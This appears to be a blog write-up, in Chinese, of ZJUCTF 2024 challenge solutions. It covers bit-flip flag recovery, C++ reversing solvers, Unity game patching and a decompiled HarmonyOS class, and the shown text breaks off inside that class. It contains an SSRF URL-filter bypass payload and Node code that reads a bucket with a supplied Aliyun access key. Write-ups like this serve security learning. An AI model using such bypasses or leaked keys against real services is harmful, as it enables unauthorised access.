+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">Bit of plain:</span><br><span class="line"></span><br><span class="line">01010010011011110110110101100001011011100110001101100101001000000110100101101110001000000111010001101000011001010010000001101101011101010110111001100100011000010110111001100101001000000111011101101111011100100110110001100100001000000110100101110011001000000110110001101001011010110110010100100000011000010010000001110011011101000110000101110010011100100111100100100000011100110110101101111001001000000110000101100100011011010110100101110010011001010110010000100000011001100111001001101111011011010010000001100001001000000110001001110101011100110111010001101100011010010110111001100111001000000110001101101001011101000111100100101110</span><br><span class="line"></span><br><span class="line">if flag is 1</span><br><span class="line"></span><br><span class="line">10011100010010100100100110111110010010111011110110111001110000000100111001001011110000000101100001001111101110011100000001001001101001100100101110111000010000011011010001000110001111111010010110110101101000111011011110111000001111111011000110100010001111111011011110110001101100100100011000111111101111100011111110100010010110000100000110100011101000111010111000111111101000100100110110101110001111111011111001000111101101100100111001011100010001100100011111000000010001000101110001001010010010011100000001000001110000000100001110100110010111011010011110110111101100011011010001000101110000000100001001001110010110000101000111001011</span><br><span class="line"></span><br><span class="line">if flag is 0</span><br><span class="line"></span><br><span class="line">01100011101101011011011001000001101101000100001001000110001111111011000110110100001111111010011110110000010001100011111110110110010110011011010001000111101111100100101110111001110000000101101001001010010111000100100001000111110000000100111001011101110000000100100001001110010011011011100111000000010000011100000001011101101001111011111001011100010111000101000111000000010111011011001001010001110000000100000110111000010010011011000110100011101110011011100000111111101110111010001110110101101101100011111110111110001111111011110001011001101000100101100001001000010011100100101110111010001111111011110110110001101001111010111000110100</span><br><span class="line"></span><br><span class="line">* we are sure flag is 0</span><br><span class="line"></span><br><span class="line">Real:</span><br><span class="line"></span><br><span class="line">01100011101101011011011000000011101101000101001001000110001111101011000110010100001111111010011110110000010001100011111110110110010110011011010001000111101111100100101110111001110000000101101001001010010111000100100011000111110000000000111001011101111000000100100001001110010011011011100111000000010000011100000001011101101001111011111001011100010111100101000111000000010111011011001001010001110000000100000110111000010010011011000110100011101110011011100010111111101110111010001110110101101101100011111110111110001110111011110001011001101000100101100001001000010011100100101110111010001111111011110110110001101001111010111000110100</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">compare</span><br><span class="line">                         !    !            !                   !          !                                                                                                                                             !                !                !                                                                                                   !                                                                                                         !                  </span><br><span class="line">01100011101101011011011001000001101101000100001001000110001111111011000110110100001111111010011110110000010001100011111110110110010110011011010001000111101111100100101110111001110000000101101001001010010111000100100001000111110000000100111001011101110000000100100001001110010011011011100111000000010000011100000001011101101001111011111001011100010111000101000111000000010111011011001001010001110000000100000110111000010010011011000110100011101110011011100000111111101110111010001110110101101101100011111110111110001111111011110001011001101000100101100001001000010011100100101110111010001111111011110110110001101001111010111000110100</span><br><span class="line">01100011101101011011011000000011101101000101001001000110001111101011000110010100001111111010011110110000010001100011111110110110010110011011010001000111101111100100101110111001110000000101101001001010010111000100100011000111110000000000111001011101111000000100100001001110010011011011100111000000010000011100000001011101101001111011111001011100010111100101000111000000010111011011001001010001110000000100000110111000010010011011000110100011101110011011100010111111101110111010001110110101101101100011111110111110001110111011110001011001101000100101100001001000010011100100101110111010001111111011110110110001101001111010111000110100</span><br><span class="line"></span><br><span class="line">Not same at 25</span><br><span class="line">Not same at 30</span><br><span class="line">Not same at 43</span><br><span class="line">Not same at 63</span><br><span class="line">Not same at 74</span><br><span class="line">Not same at 216</span><br><span class="line">Not same at 233</span><br><span class="line">Not same at 250</span><br><span class="line">Not same at 350</span><br><span class="line">Not same at 456</span><br><span class="line">Not same at 517</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">9 bit at flag str</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">- flag</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">011011010111001110011001100000101110011110000100010100100110011110111001101101111011011110010101101110000100101000101011101110011100000110010101100110100100011001001000110000101100101001001001101110011001010110100111101101011001010110010001100011000110011001111101100110000111101110010101110111000010100000100011110110000011111001010110</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">reversed</span><br><span class="line">010110111100101001010101010000111001010001000110011110110101010001100101011011000110110001011111011001000110111100111110011001010010000101011111010101110110010101101100101000111010111101101101011001010101111101110100011011110101111101011001010010100101010101000011010101000100011001011111001100100011110000110010001101000010000101111101</span><br><span class="line"></span><br><span class="line">[ÊUCF&#123;Tell_do&gt;e!_Wel£¯me_to_YJUCTF_2&lt;24!&#125;</span><br><span class="line"></span><br><span class="line">Guess Real flag is:</span><br><span class="line"></span><br><span class="line">ZJUCTF&#123;Well_done!_Welcome_to_ZJUCTF_2024!&#125;</span><br></pre></td></tr></table></figure>
+
+
+<h1 id="Shad0wTime"><a href="#Shad0wTime" class="headerlink" title="Shad0wTime"></a>Shad0wTime</h1><p>绷</p>
+<p>输出的东西重新输入即可</p>
+<p>喜报：比赛结束后容器连不上了，所以没有flag</p>
+<h1 id="easy-Pentest"><a href="#easy-Pentest" class="headerlink" title="easy Pentest"></a>easy Pentest</h1><p>几天前写某项目的后端时还在跟阿里云OSS斗智斗勇，这下题就来了。</p>
+<p>直接启动Aliyun OSS Node SDK</p>
+<p>（无敌了，带有secret key，Github就不让交commit（倒也合理）</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="variable constant_">OSS</span> = <span class="built_in">require</span>(<span class="string">&#x27;ali-oss&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 初始化OSS客户端。请将以下参数替换为您自己的配置信息。</span></span><br><span class="line"><span class="keyword">const</span> client = <span class="keyword">new</span> <span class="title function_">OSS</span>(&#123;</span><br><span class="line">  <span class="attr">region</span>: <span class="string">&#x27;oss-cn-beijing&#x27;</span>, <span class="comment">// 示例：&#x27;oss-cn-hangzhou&#x27;，填写Bucket所在地域。</span></span><br><span class="line">  <span class="attr">accessKeyId</span>: <span class="string">&quot;LTAI5tLeHk1m8rLauyjs6Fyp&quot;</span>, <span class="comment">// 确保已设置环境变量OSS_ACCESS_KEY_ID。</span></span><br><span class="line">  <span class="attr">accessKeySecret</span>: ..., <span class="comment">// 确保已设置环境变量OSS_ACCESS_KEY_SECRET。</span></span><br><span class="line">  <span class="attr">bucket</span>: <span class="string">&#x27;oss-test-qazxsw&#x27;</span>, <span class="comment">// 示例：&#x27;my-bucket-name&#x27;，填写存储空间名称。</span></span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">get</span> () &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      <span class="comment">// 填写Object完整路径和本地文件的完整路径。Object完整路径中不能包含Bucket名称。</span></span><br><span class="line">      <span class="comment">// 如果指定的本地文件存在会覆盖，不存在则新建。</span></span><br><span class="line">      <span class="comment">// 如果未指定本地路径，则下载后的文件默认保存到示例程序所属项目对应本地路径中。</span></span><br><span class="line">      <span class="keyword">const</span> result = <span class="keyword">await</span> client.<span class="title function_">get</span>(<span class="string">&#x27;fffffflllllaaaagggg.txt&#x27;</span>, <span class="string">&#x27;E:\\Projects\\ctf-test\\zjuc--aliyun\\examplefile.txt&#x27;</span>);</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(result);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(e);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="title function_">get</span>(); </span><br></pre></td></tr></table></figure>
+
+<p>拿到flag<code>flag&#123;99b87fa89d7e147c42e709dcd378e03e&#125;</code></p>
+<h1 id="山雀"><a href="#山雀" class="headerlink" title="山雀"></a>山雀</h1><p><a target="_blank" rel="noopener" href="https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery/url-format-bypass">https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery/url-format-bypass</a></p>
+<p><code>HTtP:𝓱𝓮𝓻E－𝓲𝓼｡𝔂𝓸𝓾𝒓．𝒻𝓁𝒶𝒂𝙖ⒶA④𝒈。URL</code></p>
+<p><img data-src="/arch/ZJUCTF-2024-Writeup/p7.png"></p>
+<h1 id="rev-beginner-1"><a href="#rev-beginner-1" class="headerlink" title="rev beginner 1"></a>rev beginner 1</h1><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"> <span class="type">char</span> v9[<span class="number">31</span>]=<span class="string">&quot;ZKWFXK\201ym\177it\177lt\204~p\204|&#123;&#125;\212V\225&quot;</span>; </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>** argv)</span> </span>&#123;</span><br><span class="line">	 <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt;= <span class="number">24</span>; ++i )cout&lt;&lt;(<span class="type">char</span>)(v9[i] - i);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>会C++就行</p>
+<p>flag为<code>ZJUCTF&#123;rev_is_fun_right?&#125;</code></p>
+<h1 id="rev-beginner-2"><a href="#rev-beginner-2" class="headerlink" title="rev beginner 2"></a>rev beginner 2</h1><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">char</span> <span class="title">das</span><span class="params">(<span class="type">char</span> al)</span> </span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> cf = <span class="number">0</span>;</span><br><span class="line">    <span class="type">char</span> result = al;</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line">    <span class="keyword">if</span> ((al &amp; <span class="number">0x0F</span>) &gt; <span class="number">0x09</span>) &#123;</span><br><span class="line">        result = (result &amp; <span class="number">0xF0</span>) + ((result &amp; <span class="number">0x0F</span>) - <span class="number">0x06</span>);</span><br><span class="line">        cf = <span class="number">1</span>; </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ((al &amp; <span class="number">0xF0</span>) &gt; <span class="number">0x90</span> || cf) &#123;</span><br><span class="line">        result = ((result &amp; <span class="number">0x0F</span>) &lt;&lt; <span class="number">4</span>) + ((result &gt;&gt; <span class="number">4</span>) - <span class="number">0x06</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"> <span class="function"><span class="type">char</span> <span class="title">undas</span><span class="params">( <span class="type">char</span> bcd)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">//return bcd;</span></span><br><span class="line"><span class="comment">//return bcd+0x06;</span></span><br><span class="line"><span class="comment">//return bcd+0x60;</span></span><br><span class="line"><span class="keyword">return</span> bcd+<span class="number">0x66</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">char</span> <span class="title">to_valid_char</span><span class="params">(<span class="type">char</span> c)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (c &gt;= <span class="string">&#x27;0&#x27;</span> &amp;&amp; c &lt;= <span class="string">&#x27;9&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> c;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (c &gt;= <span class="string">&#x27;A&#x27;</span> &amp;&amp; c &lt;= <span class="string">&#x27;Z&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> c;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (c &gt;= <span class="string">&#x27;a&#x27;</span> &amp;&amp; c &lt;= <span class="string">&#x27;z&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> c;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(c == <span class="string">&#x27;_&#x27;</span> || c == <span class="string">&#x27;.&#x27;</span> || c == <span class="string">&#x27;-&#x27;</span> || c == <span class="string">&#x27;!&#x27;</span> || c == <span class="string">&#x27;@&#x27;</span> || c == <span class="string">&#x27;#&#x27;</span> || c == <span class="string">&#x27;$&#x27;</span> || c == <span class="string">&#x27;%&#x27;</span> || c == <span class="string">&#x27;^&#x27;</span> || c == <span class="string">&#x27;&amp;&#x27;</span> || c == <span class="string">&#x27;*&#x27;</span> || c == <span class="string">&#x27;(&#x27;</span> || c == <span class="string">&#x27;)&#x27;</span> || c == <span class="string">&#x27;+&#x27;</span> || c == <span class="string">&#x27;=&#x27;</span> || c == <span class="string">&#x27;&#123;&#x27;</span> || c == <span class="string">&#x27;&#125;&#x27;</span> || c == <span class="string">&#x27;[&#x27;</span> || c == <span class="string">&#x27;]&#x27;</span> || c == <span class="string">&#x27;|&#x27;</span> || c == <span class="string">&#x27;:&#x27;</span> || c == <span class="string">&#x27;;&#x27;</span> || c == <span class="string">&#x27;,&#x27;</span> || c == <span class="string">&#x27;&lt;&#x27;</span> || c == <span class="string">&#x27;.&#x27;</span> || c == <span class="string">&#x27;&gt;&#x27;</span> || c == <span class="string">&#x27;?&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> c;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>** argv)</span> </span>&#123;</span><br><span class="line">	<span class="type">char</span> v12[<span class="number">26</span>];</span><br><span class="line">  *(<span class="type">int</span> *)v12 = <span class="number">0x30231E3C</span>;</span><br><span class="line">  *(<span class="type">int</span> *)&amp;v12[<span class="number">4</span>] = <span class="number">0x794D0D52</span>;</span><br><span class="line">  *(<span class="type">int</span> *)&amp;v12[<span class="number">8</span>] = <span class="number">0xDB4F3D42</span>;</span><br><span class="line">  *(<span class="type">int</span> *)&amp;v12[<span class="number">12</span>] = <span class="number">0x2FB3FF</span>;</span><br><span class="line">  *(<span class="type">int</span> *)&amp;v12[<span class="number">16</span>] = <span class="number">0x4F323E1F</span>;</span><br><span class="line">  *(<span class="type">int</span> *)&amp;v12[<span class="number">20</span>] = <span class="number">0xA4A33E52</span>;</span><br><span class="line">  v12[<span class="number">25</span>]=<span class="number">0x21</span>;</span><br><span class="line">  v12[<span class="number">26</span>]=<span class="number">0x8f</span>;</span><br><span class="line">  <span class="type">char</span> v14[<span class="number">26</span>];</span><br><span class="line">  *(<span class="type">int</span> *)&amp;v14[<span class="number">0</span>] = <span class="number">-778337675</span>;</span><br><span class="line">  *(<span class="type">int</span> *)&amp;v14[<span class="number">4</span>] = <span class="number">916896758</span>;</span><br><span class="line">  *(<span class="type">int</span> *)&amp;v14[<span class="number">8</span>] = <span class="number">2142365868</span>;</span><br><span class="line">  *(<span class="type">int</span> *)&amp;v14[<span class="number">12</span>] = <span class="number">431515568</span>;</span><br><span class="line">  *(<span class="type">int</span> *)&amp;v14[<span class="number">16</span>] = <span class="number">121126838</span>;</span><br><span class="line">  *(<span class="type">int</span> *)&amp;v14[<span class="number">20</span>] = <span class="number">1384365358</span>;</span><br><span class="line">  v14[<span class="number">25</span>] = <span class="number">0xf5</span>;</span><br><span class="line">  v14[<span class="number">26</span>] = <span class="number">0xff</span>;</span><br><span class="line">  <span class="type">char</span> s2[<span class="number">26</span>];</span><br><span class="line">  *(<span class="type">int</span> *)&amp;s2[<span class="number">0</span>] = <span class="number">0xE4CDA88D</span>;</span><br><span class="line">  *(<span class="type">int</span> *)&amp;s2[<span class="number">4</span>] = <span class="number">0xCECEEEF8</span>;</span><br><span class="line">  *(<span class="type">int</span> *)&amp;s2[<span class="number">8</span>] = <span class="number">0x6EBF11CF</span>;</span><br><span class="line">  *(<span class="type">int</span> *)&amp;s2[<span class="number">12</span>] = <span class="number">0x4B50B9B8</span>;</span><br><span class="line">  *(<span class="type">int</span> *)&amp;s2[<span class="number">16</span>] = <span class="number">0x286B6DBE</span>;</span><br><span class="line">  *(<span class="type">int</span> *)&amp;s2[<span class="number">20</span>] = <span class="number">0xB3F3EB41</span>;</span><br><span class="line">  s2[<span class="number">25</span>] = <span class="number">0xf5</span>;</span><br><span class="line">  s2[<span class="number">26</span>] = <span class="number">0x87</span>;</span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt;= <span class="number">25</span>; ++i) &#123;</span><br><span class="line">        <span class="type">char</span> _AL = s2[i] - v14[i];</span><br><span class="line">        </span><br><span class="line"><span class="comment">//        _AL = das(_AL)</span></span><br><span class="line"><span class="comment">//		__asm(&quot;das&quot;);</span></span><br><span class="line">_AL=<span class="built_in">undas</span>(_AL);</span><br><span class="line">        </span><br><span class="line">        s2[i] = v12[i] + _AL;</span><br><span class="line"></span><br><span class="line">        s2[i] = <span class="built_in">to_valid_char</span>(s2[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line"><span class="comment">//    printf(&quot;%&quot;,s2);</span></span><br><span class="line">	cout&lt;&lt;s2;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+<p><code>das</code>函数是真的在尝试逆向das，失败</p>
+<p>直接暴力：反正<code>das</code>就是前后两各4bit看情况减6，不如直接试。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#</span><br><span class="line">   00000000011111111112222222</span><br><span class="line">   12345678901234567890123456</span><br><span class="line">#1 ZJ[IZF&#123; klc    8-rkvkr  _</span><br><span class="line">#2        w   0mk-       yk</span><br><span class="line">#3        q   *ge        se</span><br><span class="line">#4 TDUCT@u ef]    2 lepel  Y!</span><br><span class="line"></span><br><span class="line">R  ZJUCTF&#123;welc0me-2-reverse!&#125;</span><br></pre></td></tr></table></figure>
+
+<h1 id="Minec-re-tf-Unity-Edition"><a href="#Minec-re-tf-Unity-Edition" class="headerlink" title="Minec(re)tf Unity Edition"></a>Minec(re)tf Unity Edition</h1><p>Piece 1: 用Cheat Engine改数据</p>
+<p><img data-src="/arch/ZJUCTF-2024-Writeup/p8.png"></p>
+<p>Piece 2: 用dotpeek反编译（p.s. 一开始没想到用dnSpy）</p>
+<p><img data-src="/arch/ZJUCTF-2024-Writeup/p9.png"></p>
+<p>Piece 3: 用Assets Studio查素材</p>
+<p><img data-src="/arch/ZJUCTF-2024-Writeup/p10.png"></p>
+<p>Piece 4: 用dnSpy上patch</p>
+<p><img data-src="/arch/ZJUCTF-2024-Writeup/p11.png"></p>
+<p>当然，我们的大聪明还有一种非预期，那就是把所有cube全dump出来，然后盯着一堆方块始终认不对。</p>
+<p>我要让所有人体验一遍这种痛苦（误</p>
+<p>解压pdf后面续的zip文件，进入<code>/zjuc--mc/threejs</code>，通过<code>python -m http.server</code>或者<code>npx serve</code>等方式启动服务器，然后进入<code>localhost:&lt;port&gt;/dumped.html</code></p>
+<p>你可以通过鼠标和键盘进行操作。</p>
+<p><img data-src="/arch/ZJUCTF-2024-Writeup/p12.png"></p>
+<p><img data-src="/arch/ZJUCTF-2024-Writeup/p13.png" alt="真能认出来吗？哈哈，那无敌了"></p>
+<h1 id="easy-hap"><a href="#easy-hap" class="headerlink" title="easy hap"></a>easy hap</h1><p>拖进Abc-decompiler，前往CipherUtil方法</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">CipherUtil</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* renamed from: pkgName@entry, reason: not valid java name */</span></span><br><span class="line">    <span class="keyword">public</span> Object f0pkgNameentry;</span><br><span class="line">    <span class="keyword">public</span> Object isCommonjs;</span><br><span class="line">    <span class="keyword">public</span> Object moduleRecordIdx;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object #<span class="number">1</span>#(Object functionObject, Object newTarget, CipherUtil <span class="built_in">this</span>, Object arg0) &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> _lexenv_0_2_.cipherX;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">init</span> <span class="operator">=</span> obj.init(<span class="keyword">import</span> &#123; <span class="keyword">default</span> as cryptoFramework &#125; from <span class="string">&quot;@ohos:security.cryptoFramework&quot;</span>.CryptoMode.ENCRYPT_MODE, arg0, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span> init.then(#<span class="number">2</span>#);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object #<span class="number">2</span>#(Object functionObject, Object newTarget, CipherUtil <span class="built_in">this</span>) &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> _lexenv_0_2_.cipherX;</span><br><span class="line">        <span class="keyword">return</span> obj.doFinal(_lexenv_0_0_);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object #<span class="number">3</span>#(Object functionObject, Object newTarget, CipherUtil <span class="built_in">this</span>, Object arg0) &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> _lexenv_0_3_.cipherY;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">init</span> <span 